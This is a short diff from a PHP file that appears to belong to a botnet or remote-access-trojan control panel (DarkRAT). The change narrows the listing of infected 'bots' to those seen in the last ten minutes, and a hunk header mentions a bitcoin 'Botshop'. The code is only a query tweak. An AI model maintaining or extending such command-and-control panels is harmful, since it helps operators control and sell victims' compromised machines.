@@ -534,7 +534,7 @@ Botshop Proift btc $
             if(empty($_SESSION["darkrat_userid"])) {
                 die("Login Required");
             }
-            $sql = "SELECT *, UNIX_TIMESTAMP(lastresponse) as lastresponse, UNIX_TIMESTAMP(now()) as now FROM bots ORDER BY lastresponse DESC";
+            $sql = "SELECT *, UNIX_TIMESTAMP(lastresponse) as lastresponse, UNIX_TIMESTAMP(now()) as now FROM bots WHERE lastresponse >= NOW() - INTERVAL 10 MINUTE ORDER BY lastresponse DESC";
             $allbots = array();
             $botcount = 0;
             foreach ($GLOBALS["pdo"]->query($sql) as $row) {
